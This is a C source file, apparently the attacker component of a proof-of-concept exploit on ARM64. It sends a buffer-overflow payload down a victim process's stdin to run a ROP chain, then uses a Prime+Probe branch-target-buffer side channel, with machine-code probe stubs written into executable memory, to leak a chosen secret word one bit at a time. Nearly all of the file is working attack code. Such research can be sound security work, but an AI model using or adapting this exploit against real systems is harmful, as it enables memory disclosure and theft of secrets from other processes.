#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include "poc.h"
#include "donor.h"
#include "attacker.h"

#define MAXK 48
#define MAXW 32
#define VREP        1   // windows per shot: >=4 saturates the BTB set and collapses the channel
#define SYNC_YIELDS 6
#define PRIMER      4
#define PRIMEPASS   2
#define PRIMEMB     8
#define STRIDE (1UL << 13)

static int KC = 24;
static int W = 24;
static int SAMPLES = 1500;
static int PASSES = 3;

typedef void (*branch_fn_t)(void);
static branch_fn_t probe[MAXK][MAXW] = { 0 };
static int cand_set[MAXK] = { 0 };
static uint64_t cand_blr[MAXK] = { 0 };
static uint64_t retpad = 0;
static uint64_t arena_base = 0;
static uint8_t *primebuf = NULL;
static size_t primelen = 0;

static int g_wfd = 0;
static pid_t g_pid = 0;
static volatile int g_crashed = 0;
static volatile int g_killsig = 0;

static inline uint64_t rd_cntvct(void) {
    uint64_t value = 0;
    asm volatile("mrs %0,cntvct_el0" : "=r"(value));
    return value;
}
static inline void fence(void) { asm volatile("dsb sy\n isb\n" ::: "memory"); }

static void emit_probe(void *addr, uint64_t tgt) {
    uint32_t *words = (uint32_t *)addr;
    words[0] = 0xF81F0FFEu;
    words[1] = 0xD2800010u | (uint32_t)((tgt & 0xffff) << 5);
    words[2] = 0xF2A00010u | (uint32_t)(((tgt >> 16) & 0xffff) << 5);
    words[3] = 0xF2C00010u | (uint32_t)(((tgt >> 32) & 0xffff) << 5);
    words[4] = words[5] = words[6] = words[7] = words[8] = words[9] = words[10] = 0xD503201Fu;
    words[11] = 0xD63F0200u;
    words[12] = 0xF84107FEu;
    words[13] = 0xD65F03C0u;
    __builtin___clear_cache((char *)addr, (char *)addr + 64);
}

static void cache_prime(void) {
    for (int pass = 0; pass < PRIMEPASS; ++pass) {
        for (size_t offset = 0; offset < primelen; offset += 64) {
            ((volatile uint8_t *)primebuf)[offset]++;
        }
    }
    asm volatile("dsb sy" ::: "memory");
}

static void check_child(void) {
    int status = 0;
    if (waitpid(g_pid, &status, WNOHANG) == g_pid) {
        g_crashed = 1;
        g_killsig = WIFSIGNALED(status) ? WTERMSIG(status) : -WEXITSTATUS(status);
    }
}

// One shot: write the overflow down the victim's stdin, wait (via FIONREAD) until it has consumed
// it and is executing the ROP window, then let the short window finish before probing.
static void fire_once(void) {
    if (write(g_wfd, payload, PAYLEN) != PAYLEN) {
        check_child();
        return;
    }
    unsigned long spins = 0;
    int remaining = PAYLEN;
    while (remaining > 0) {
        ioctl(g_wfd, FIONREAD, &remaining);
        sched_yield();
        if ((++spins & 0x3ff) == 0) {
            check_child();
            if (g_crashed) {
                return;
            }
        }
        if (spins > 2000000) {
            break;
        }
    }
    for (int yield_index = 0; yield_index < SYNC_YIELDS; ++yield_index) {
        sched_yield();
    }
}

static void run_victim(uint64_t x0, uint64_t bit) {
    *(uint64_t *)(payload + CHAIN_OFF + OFF_X0) = x0;            // secret word address (DEREF's x0)
    *(uint64_t *)(payload + CHAIN_OFF + OFF_BIT) = (1UL << bit); // the bit to isolate (AND's mask)
    for (int rep_index = 0; rep_index < VREP; ++rep_index) {
        fire_once();
    }
}

// One measurement pass. trigger=1 primes, fires the window, then times each candidate set. trigger=0
// is the same probe with no window, a baseline the caller subtracts to cancel ambient drift.
static void pass(int trigger, uint64_t x0, uint64_t bit, long *out) {
    if (trigger) {
        cache_prime();
    }
    for (int round = 0; round < PRIMER; ++round) {
        for (int cand = 0; cand < KC; ++cand) {
            for (int way = 0; way < W; ++way) {
                probe[cand][way]();
            }
        }
    }
    if (trigger) {
        run_victim(x0, bit);
    }
    fence();
    for (int cand = 0; cand < KC; ++cand) {
        asm volatile("isb");
        uint64_t start = rd_cntvct();
        for (int way = 0; way < W; ++way) {
            probe[cand][way]();
        }
        asm volatile("isb");
        out[cand] = (long)(rd_cntvct() - start);
    }
}

// Measure the target bit against a canonical and a non-canonical calibration, rotating their order
// each iteration and subtracting a no-window baseline so drift cannot masquerade as signal.
static void recover3(uint64_t tgt_x0, uint64_t tgt_bit, uint64_t calib_x0, double *sig) {
    static long accum[3][MAXK] = { 0 };
    static long measured[3][MAXK] = { 0 };
    static long baseline[MAXK] = { 0 };
    uint64_t x0_choices[3] = { tgt_x0, calib_x0, calib_x0 };
    uint64_t bit_choices[3] = { tgt_bit, 0, 1 };
    for (int pos = 0; pos < 3; ++pos) {
        for (int cand = 0; cand < KC; ++cand) {
            accum[pos][cand] = 0;
        }
    }
    for (int sample = 0; sample < SAMPLES; ++sample) {
        int rotate = sample % 3;
        for (int offset = 0; offset < 3; ++offset) {
            int pos = (rotate + offset) % 3;
            pass(1, x0_choices[pos], bit_choices[pos], measured[pos]);
        }
        pass(0, 0, 0, baseline);
        for (int pos = 0; pos < 3; ++pos) {
            for (int cand = 0; cand < KC; ++cand) {
                accum[pos][cand] += measured[pos][cand] - baseline[cand];
            }
        }
    }
    for (int pos = 0; pos < 3; ++pos) {
        double decoy_mean = 0;
        for (int cand = 1; cand < KC; ++cand) {
            decoy_mean += accum[pos][cand];
        }
        decoy_mean /= (KC - 1);
        sig[pos] = (double)accum[pos][0] - decoy_mean;   // signal set minus the mean of the decoy sets
    }
}

static double g_last_margin = 0;

int leak_bit(uint64_t tgt_x0, uint64_t tgt_bit, uint64_t calib_x0) {
    double sig[3] = { 0, 0, 0 };
    for (int pass_index = 0; pass_index < PASSES; ++pass_index) {
        double pass_sig[3] = { 0 };
        recover3(tgt_x0, tgt_bit, calib_x0, pass_sig);
        for (int pos = 0; pos < 3; ++pos) {
            sig[pos] += pass_sig[pos];
        }
    }
    double dC = (sig[0] > sig[1]) ? sig[0] - sig[1] : sig[1] - sig[0];
    double dN = (sig[0] > sig[2]) ? sig[0] - sig[2] : sig[2] - sig[0];
    double gap = (dC > dN) ? dC - dN : dN - dC;
    double span = dC + dN;
    g_last_margin = (span > 0) ? gap / span : 0.0;
    return (dC < dN) ? 0 : 1;   // closer to the canonical calibration => bit 0
}

double attacker_bit_margin(void) { return g_last_margin; }

static void place_probes(void) {
    int line_off = donor_transmit_line_off();
    for (int cand = 0; cand < KC; ++cand) {
        for (int way = 0; way < W; ++way) {
            uint64_t blr = arena_base + (uint64_t)way * STRIDE + (uint64_t)cand_set[cand] * 64 + line_off;
            emit_probe((void *)(blr - 0x2C), retpad);   // the stub's blr lands exactly at blr
            probe[cand][way] = (branch_fn_t)(blr - 0x2C);
            if (way == 0) {
                cand_blr[cand] = blr;
            }
        }
    }
}

void attacker_set_samples(int samples) { SAMPLES = samples; }

void attacker_bind_victim(pid_t pid, int stdin_wfd) {
    g_pid = pid;
    g_wfd = stdin_wfd;
}

int attacker_crashed(int *killsig) {
    check_child();
    if (killsig) {
        *killsig = g_killsig;
    }
    return g_crashed;
}

void attacker_setup(int transmit_set, int tail_set) {
    int used[128] = { 0 };
    used[tail_set] = 1;
    used[transmit_set] = 1;
    cand_set[0] = transmit_set;
    int count = 1;
    int set_idx = transmit_set;
    while (count < KC) {
        set_idx = (set_idx + 7) & 127;
        if (set_idx >= 1 && !used[set_idx]) {
            used[set_idx] = 1;
            cand_set[count++] = set_idx;
        }
    }

    uint8_t *arena = mmap(NULL, (size_t)(W + 1) * STRIDE, PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    arena_base = ((uint64_t)arena + STRIDE - 1) & ~(STRIDE - 1);

    uint8_t *ret_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    *(uint32_t *)ret_page = 0xD65F03C0u;   // ret
    __builtin___clear_cache((char *)ret_page, (char *)ret_page + 4);
    retpad = (uint64_t)ret_page;

    place_probes();
    for (int cand = 0; cand < KC; ++cand) {
        if ((int)SET_OF(cand_blr[cand]) != cand_set[cand]) {
            printf("!! probe placement\n");
            _exit(1);
        }
    }

    primelen = (size_t)PRIMEMB * 1024 * 1024;
    primebuf = mmap(NULL, primelen, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (primebuf == MAP_FAILED) {
        perror("mmap prime");
        _exit(1);
    }
    memset(primebuf, 1, primelen);

    printf("Prime+Probe channel: transmit BTB set %d, %d candidate sets\n", transmit_set, KC);
}
